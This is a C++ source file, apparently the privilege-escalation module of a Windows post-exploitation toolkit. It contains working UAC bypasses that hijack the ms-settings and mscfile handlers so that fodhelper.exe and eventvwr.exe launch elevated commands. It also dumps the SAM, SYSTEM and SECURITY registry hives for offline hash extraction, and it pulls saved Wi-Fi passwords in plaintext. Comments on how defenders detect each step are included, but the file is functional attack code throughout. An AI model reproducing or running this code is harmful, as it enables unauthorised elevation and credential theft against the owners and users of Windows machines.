#include "PrivEsc.h"
#include <wlanapi.h>

// ── Shared: write a registry string value ─────────────────────────────────────
static bool RegSetStr(HKEY hRoot, const char* subkey, const char* name, const char* val) {
    HKEY hKey = NULL;
    if (RegCreateKeyExA(hRoot, subkey, 0, NULL, REG_OPTION_NON_VOLATILE,
                        KEY_SET_VALUE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return false;
    bool ok = RegSetValueExA(hKey, name, 0, REG_SZ,
                             (const BYTE*)val, (DWORD)strlen(val) + 1) == ERROR_SUCCESS;
    RegCloseKey(hKey);
    return ok;
}

// ── UAC bypass helper: write COM handler keys, run binary, sleep, clean up ───
static std::string RunUacBypass(const char* comSubkey, const char* binaryName,
                                 const std::string& cmd) {
    // Write HKCU\Software\Classes\<comSubkey>\shell\open\command = cmd
    std::string cmdKey = std::string("Software\\Classes\\") + comSubkey +
                         "\\shell\\open\\command";

    if (!RegSetStr(HKEY_CURRENT_USER, cmdKey.c_str(), NULL, cmd.c_str())) {
        return std::string("uac (") + binaryName + "): registry write failed";
    }

    // DelegateExecute triggers the auto-elevation path
    if (!RegSetStr(HKEY_CURRENT_USER, cmdKey.c_str(), "DelegateExecute", "")) {
        RegDeleteTreeA(HKEY_CURRENT_USER,
                       (std::string("Software\\Classes\\") + comSubkey).c_str());
        return std::string("uac (") + binaryName + "): DelegateExecute write failed";
    }

    // Detection: fodhelper.exe / eventvwr.exe spawned from a medium-integrity process
    // triggers auto-elevation — no UAC prompt for the auto-elevate-capable binary itself
    char windir[MAX_PATH] = {};
    GetWindowsDirectoryA(windir, sizeof(windir) - 1);
    std::string exe = std::string(windir) + "\\System32\\" + binaryName;

    SHELLEXECUTEINFOA sei = {};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = "open";
    sei.lpFile = exe.c_str();
    sei.nShow  = SW_HIDE;
    sei.fMask  = SEE_MASK_NOCLOSEPROCESS;
    ShellExecuteExA(&sei);

    if (sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 5000);
        CloseHandle(sei.hProcess);
    }

    // Clean up registry key — remove both the DelegateExecute value and the subtree
    RegDeleteTreeA(HKEY_CURRENT_USER,
                   (std::string("Software\\Classes\\") + comSubkey).c_str());

    return std::string("uac (") + binaryName + "): launched elevated: " + cmd;
}

std::string PrivEsc::FodhelperBypass(const std::string& cmd) {
    // ms-settings is handled by fodhelper.exe, which is a UAC auto-elevate binary.
    // Writing a COM hijack under HKCU\Software\Classes makes it use our command instead.
    return RunUacBypass("ms-settings", "fodhelper.exe", cmd);
}

std::string PrivEsc::EventvwrBypass(const std::string& cmd) {
    // eventvwr.exe (Event Viewer) auto-elevates and looks up mscfile handler.
    return RunUacBypass("mscfile", "eventvwr.exe", cmd);
}

std::string PrivEsc::SamDump(const std::string& outDir) {
    // SeBackupPrivilege required to save protected hives — available to SYSTEM/Admin.
    // After saving: use secretsdump.py -sam <SAM> -system <SYSTEM> -security <SEC> LOCAL
    struct HiveEntry { std::string subkey; std::string filename; HKEY root; };
    std::vector<HiveEntry> hives = {
        { S("SAM"),      S("SAM"),      HKEY_LOCAL_MACHINE },
        { S("SYSTEM"),   S("SYSTEM"),   HKEY_LOCAL_MACHINE },
        { S("SECURITY"), S("SECURITY"), HKEY_LOCAL_MACHINE },
    };

    std::string result;
    int saved = 0;

    for (auto& h : hives) {
        HKEY hKey = NULL;
        if (RegOpenKeyExA(h.root, h.subkey.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
            result += h.filename + ": RegOpenKeyEx failed err=" +
                      std::to_string(GetLastError()) + "\n";
            continue;
        }

        std::string outPath = outDir + "\\" + h.filename;

        // Detection: RegSaveKeyExA on HKLM\SAM from a non-SYSTEM process is a
        // high-confidence credential-access alert in Windows Defender and most EDRs.
        LONG rc = RegSaveKeyExA(hKey, outPath.c_str(), NULL, REG_LATEST_FORMAT);
        RegCloseKey(hKey);

        if (rc == ERROR_SUCCESS) {
            result += h.filename + ": saved -> " + outPath + "\n";
            ++saved;
        } else if (rc == ERROR_ALREADY_EXISTS) {
            // File exists — delete and retry once
            DeleteFileA(outPath.c_str());
            HKEY hKey2 = NULL;
            RegOpenKeyExA(h.root, h.subkey.c_str(), 0, KEY_READ, &hKey2);
            rc = hKey2 ? RegSaveKeyExA(hKey2, outPath.c_str(), NULL, REG_LATEST_FORMAT)
                       : ERROR_INVALID_HANDLE;
            if (hKey2) RegCloseKey(hKey2);
            if (rc == ERROR_SUCCESS) {
                result += h.filename + ": saved -> " + outPath + "\n";
                ++saved;
            } else {
                result += std::string(h.filename) + ": RegSaveKeyEx failed err=" +
                          std::to_string(rc) + "\n";
            }
        } else {
            result += std::string(h.filename) + ": RegSaveKeyEx failed err=" +
                      std::to_string(rc) +
                      " (need SYSTEM token — run tokensteal first)\n";
        }
    }

    if (saved > 0) {
        result += "\nExtract hashes offline:\n"
                  "  python3 secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL";
    }
    return result;
}

// ── Wi-Fi password extraction ──────────────────────────────────────────────────
// Parse <keyMaterial> from the Wi-Fi profile XML.
static std::string ExtractKeyMaterial(const std::wstring& xml) {
    const wchar_t* tag = L"<keyMaterial>";
    const wchar_t* endtag = L"</keyMaterial>";
    size_t start = xml.find(tag);
    if (start == std::wstring::npos) return "(hidden or open)";
    start += wcslen(tag);
    size_t end = xml.find(endtag, start);
    if (end == std::wstring::npos) return "(malformed)";
    std::wstring wKey = xml.substr(start, end - start);
    int len = WideCharToMultiByte(CP_UTF8, 0, wKey.c_str(), -1, nullptr, 0, nullptr, nullptr);
    if (len <= 0) return "";
    std::string key(len - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, wKey.c_str(), -1, &key[0], len, nullptr, nullptr);
    return key;
}

static std::string WstrToStr(const WCHAR* wstr) {
    if (!wstr) return "";
    int len = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, nullptr, 0, nullptr, nullptr);
    if (len <= 0) return "";
    std::string s(len - 1, '\0');
    WideCharToMultiByte(CP_UTF8, 0, wstr, -1, &s[0], len, nullptr, nullptr);
    return s;
}

std::string PrivEsc::WiFiDump() {
    HANDLE hWlan = NULL;
    DWORD dwVer = 0;

    // Detection: WlanOpenHandle + WlanGetProfile(WLAN_PROFILE_GET_PLAINTEXT_KEY)
    // from a non-service process is logged by Sysmon and Windows security events.
    if (WlanOpenHandle(2, NULL, &dwVer, &hWlan) != ERROR_SUCCESS) {
        return "wifi: WlanOpenHandle failed (need admin)";
    }

    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    if (WlanEnumInterfaces(hWlan, NULL, &pIfList) != ERROR_SUCCESS) {
        WlanCloseHandle(hWlan, NULL);
        return "wifi: WlanEnumInterfaces failed";
    }

    std::string result;
    for (DWORD i = 0; i < pIfList->dwNumberOfItems; ++i) {
        PWLAN_INTERFACE_INFO pIface = &pIfList->InterfaceInfo[i];

        PWLAN_PROFILE_INFO_LIST pProfileList = NULL;
        if (WlanGetProfileList(hWlan, &pIface->InterfaceGuid, NULL, &pProfileList)
            != ERROR_SUCCESS) continue;

        for (DWORD j = 0; j < pProfileList->dwNumberOfItems; ++j) {
            const WCHAR* ssid = pProfileList->ProfileInfo[j].strProfileName;
            PWSTR pProfileXml = NULL;
            DWORD dwFlags = WLAN_PROFILE_GET_PLAINTEXT_KEY;
            DWORD dwGranted = 0;

            DWORD ret = WlanGetProfile(hWlan, &pIface->InterfaceGuid,
                                       ssid, NULL, &pProfileXml, &dwFlags, &dwGranted);
            if (ret == ERROR_SUCCESS && pProfileXml) {
                std::string key = ExtractKeyMaterial(std::wstring(pProfileXml));
                result += "SSID: " + WstrToStr(ssid) + "  Password: " + key + "\n";
                WlanFreeMemory(pProfileXml);
            } else {
                result += "SSID: " + WstrToStr(ssid) + "  Password: (access denied err=" +
                          std::to_string(ret) + ")\n";
            }
        }
        WlanFreeMemory(pProfileList);
    }

    WlanFreeMemory(pIfList);
    WlanCloseHandle(hWlan, NULL);

    return result.empty() ? "wifi: no saved profiles found" : result;
}
